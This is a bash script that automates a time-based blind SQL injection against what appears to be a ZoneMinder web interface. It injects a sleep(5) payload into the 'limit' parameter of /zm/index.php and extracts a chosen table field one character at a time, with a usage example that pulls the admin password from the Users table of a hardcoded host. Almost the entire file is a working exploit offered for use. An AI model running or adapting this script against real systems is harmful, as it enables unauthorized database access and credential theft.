#!/bin/bash

# DEFINITION OF COLORS FOR USE IN BASH SCRIPTS
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURE Ctrl+C
trap ctrl_c INT


function ctrl_c(){
    echo -e "\n[${yellow}!${def}] Detected Ctrl+C"
    echo -e "[${red}*${def}] Finalizing execution..."
    tput cnorm
    exit 0
}

function usage(){
    echo -e "\n${white}[${red}!${white}]${def} One of the following ERRORS has occurred:"
    echo -e "\t- Table name not provided (argument 1)"
    echo -e "\t- The name of the field to be used as a reference (argument 2) has not been provided."
    echo -e "\t- The value to be contained in the reference field has not been provided (rgument 3)."
    echo -e "\t- The name of the field you want to get value from (argument 4) has not been provided."
    echo -e "\t- More arguments than expected have been provided (max 5)\n"
    echo -e "${white}[${def}-${white}]${def} USAGE:\n\t${white}$0 ${yellow} <table_name> <reference_field> <reference_field_value> <field_to_get_value_from> ${grey}[field_length]${def}"
    echo -e "\t${grey}$0 Users username admin password 40${def}"
    echo -e "\n\n${white}[${yellow}!${white}]${def} REMEMBER:\n\t ${white}Tables${def} are ${white}CASE SENSITIVE${def}"
    echo -e "\tTry with the first letter in uppercase and the rest in lowercase."
    exit 0
}

if [[ "$#" -lt "4" ]]
then
    usage
fi

if [[ "$#" -gt "5" ]]
then
    usage
fi

tput civis

tablename=$1    # pass the name of the table to list as argument 1
fieldname=$2    # pass the name of the field to be referenced as argument 2
fielvalue=$3    # pass the value to be contained in the reference field as argument 3
field=$4        # pass the name of the field from which the value is to be obtained 4
charlimit=100

# ADAPT THESE VALUES
host='192.168.102.52'

# correction of the character limit depending on whether a character has been provided as an argument 5
if [[ "$#" -eq "5" ]]
then
    charlimit=$5
fi

# variable storing the characters to be tested
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!ยก\/{}[]'

# variable to store the results
result=""
whitechar=0

echo -e "\n${white}[${green}*${white}] --- Enumerating value of the field \"${yellow}$field${white}\" of the table \"${yellow}$tablename${white}\" based on the value \"${yellow}$fielvalue${white}\" of the field \"${yellow}$fieldname${white}\" of the same table --- [${green}*${white}]${def}\n"

for (( i=1; i <= $charlimit; i++))
do
    if [[ "whitechar" -ge "2" ]]
    then
        echo -e "  \e[1A\e[K[${grey}-${def}] Second blank character"
        break
    fi

    # nested loop that loops through each of the characters stored in the char variable
    for (( k=0; k<${#char}; k++ ))
    do
        echo -e "  \e[1A\e[KTesting character ${char:$k:1} in position $i: $result""_"
        
        SECONDS=0
        curl -X POST "http://$host/zm/index.php" \
        -d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( \
        SELECT( \
            if( 
                substr( \
                    (select $field from $tablename where $fieldname='$fielvalue'),$i,1)='${char:$k:1}', sleep(5), 1 \
                ) \
            ) \
        )OQkj)#minTime=1'" &>/dev/null
        
        DURATION=$SECONDS

        # verification of whether the difference between the start and end time is greater than 5 seconds
        if [[ "$DURATION" -ge "4" ]]
        then
            result+=${char:$k:1}
            if [[ "$i" -ge 1 ]]
            then
                if [[ "$whitechar" -eq 1 ]] # correction of writing if the first character was blank but not the others
                then
                    echo -e "  \e[1A\e[KCharacters found: $result\n"
                    whitechar=0
                    break
                else
                    echo -e "  \e[2A\e[KCharacters found: $result\n"
                    whitechar=0
                    break
                fi
            else
                echo -e "  \e[1A\e[KCharacters found: $result\n"
                break
            fi
        else
            if [[ "${char:$k:1}" = "z" ]]
            then
                whitechar=$((whitechar+1))
            fi
        fi
    done
done

echo -e "  ${white}Value of the $field for the value $fielvalue of the field $fieldname in table $tablename: ${green}$result${def}\n"
echo -e "  End of enumeratin."
tput cnorm